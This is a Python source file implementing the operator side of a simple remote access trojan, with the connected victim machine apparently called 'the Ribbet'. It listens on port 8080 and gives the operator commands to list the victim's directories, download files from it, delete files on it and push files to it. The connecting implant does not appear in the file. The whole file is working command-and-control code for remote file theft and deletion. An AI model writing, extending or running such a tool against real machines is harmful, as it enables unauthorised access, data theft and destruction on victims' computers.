import socket
import os
import socket

s = socket.socket()
host = socket.gethostname()
port = 8080
s.bind((host, port))
print("")
print()
print("Server is Currently running @ ", host)
print("")
print("Waiting For Any incomming Connections")
s.listen(1)
conn, addr = s.accept()
print("The Rebiit Conected &_&")
print(addr, "The Ribbet Connected ")
# Commands___________________________________________________________________________-
while 1:
    print("")
    command = input(str("Command >> "))
    if command == "cwd":
        conn.send(command.encode())
        print("")
        print("Command sent wait for execution ...")
        files = conn.recv(5000)
        files = files.decode()
        print("Command Output :", files)
    # part2
    elif command == "custom":
        conn.send(command.encode())
        print("")
        user_input = input(str("Custom Dir :"))
        conn.send(user_input.encode())
        print("Command has been sent")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Custom Dir Result :", files)

    elif command == "download":
        conn.send(command.encode())
        print("")
        file_Path = input(str("Please Enter The Filename"))
        conn.send(file_Path.encode())
        file = conn.recv(100000)
        print("")
        filename = input(str("Please Enter Filename for The incoming file including the extension :"))
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print("")
        print(filename, "Has been downloaded and saved ")
        print("")


    elif command == "remove":
        conn.send(command.encode())
        fileanddir = input(str("Please Enter The filename and directory :"))
        conn.send(fileanddir.encode())
        print("")
        print("command has been executed Successfuly : File Removed")

    elif command == "send_file":
        file = input(str("Please Enter What do you want file for Rebiet :"))
        filename = input(str("please enter the filname for the file being sent :"))
        data = open(file, "rb")
        file_data = data.read(7000)
        conn.send(filename.encode())
        print(file, "Has been sent successfuly")
        conn.send(file_data)

    else:
        print("Erorr")
